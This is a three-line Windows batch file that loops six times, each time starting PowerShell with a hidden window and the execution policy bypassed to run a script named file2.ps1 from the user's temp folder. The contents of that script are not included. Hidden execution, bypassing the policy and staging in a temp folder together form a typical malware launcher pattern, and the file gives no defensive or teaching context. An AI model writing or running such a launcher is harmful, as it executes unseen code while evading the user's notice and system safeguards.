@echo off
FOR /L %%y IN (0, 1, 5) DO PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%temp%\file2.ps1'"
pause